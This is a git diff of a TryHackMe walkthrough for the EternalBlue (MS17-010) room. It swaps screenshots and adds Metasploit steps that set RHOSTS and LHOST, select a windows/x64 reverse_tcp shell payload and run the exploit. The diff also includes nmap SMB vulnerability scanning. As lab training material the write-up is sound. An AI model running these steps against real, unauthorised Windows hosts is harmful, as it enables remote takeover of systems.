@@ -18,7 +18,7 @@ Start the Lab Machine and if using your Kali Machine, connect to the TryHackMe s
 
 write `nmap <TARGET_IP>` to scan the target system.
 
-<img width="331" height="167" alt="image" src="https://github.com/user-attachments/assets/94f5bf34-ae1a-416b-9e0b-6fa2d3713a29" />
+<img width="331" height="170" alt="image" src="https://github.com/user-attachments/assets/0e777977-f231-4a12-ba35-fa03bef896d8" />
 
 2. How many ports are open with a port number under 1000?
 
@@ -30,7 +30,7 @@ ms17-010
 
 Specifically for the EternalBlue room, you can check the smb vulnerability by: `nmap --script smb-vuln* -p445 <TARGET_IP>`
 
-<img width="521" height="275" alt="image" src="https://github.com/user-attachments/assets/d121ed40-a478-461c-963c-089af62635e6" />
+<img width="521" height="276" alt="image" src="https://github.com/user-attachments/assets/908f5d81-00c1-442e-bcef-b416f061ba94" />
 
 This vulnerability corresponds to [CVE-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143), commonly known as EternalBlue, a critical flaw in the SMBv1 (Server Message Block version 1) protocol that allows remote attackers to execute arbitrary code on affected Windows systems without authentication.
 
@@ -58,7 +58,24 @@ Write command `use 0` to select the desired path.
 
 Check the parameters by command: `show options`. RHOSTS is the answer of this question.
 
-<img width="677" height="338" alt="image" src="https://github.com/user-attachments/assets/d7bb1a37-6892-4825-aba6-3e6710520ac0" />
+<img width="1300" height="529" alt="image" src="https://github.com/user-attachments/assets/f8a32932-7349-4250-b95c-5d027d236a1d" />
+
+Set the `RHOSTS` parameter by: `set RHOSTS <TARGET_IP>`
+
+Set the `LHOST` paremeter by: `set LHOST <YOUR_TUN0_IP>`. You can see your TryHackMe IP by `ipconfig`
+
+<img width="1044" height="607" alt="image" src="https://github.com/user-attachments/assets/a982b077-4f42-4d06-bf41-1a2e9c691998" />
+
+4. Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter: `set payload windows/x64/shell/reverse_tcp`. With that done, run the exploit!
+
+<img width="455" height="40" alt="image" src="https://github.com/user-attachments/assets/b5e8ac91-ee59-4938-ac41-880d8a3f1929" />
+
+Then write command: `exploit` to run the exploit:
+
+<img width="1104" height="499" alt="image" src="https://github.com/user-attachments/assets/ad9b3792-0d9b-49b1-a02a-cb29ee2e663c" />
+
+
+
 
 
 
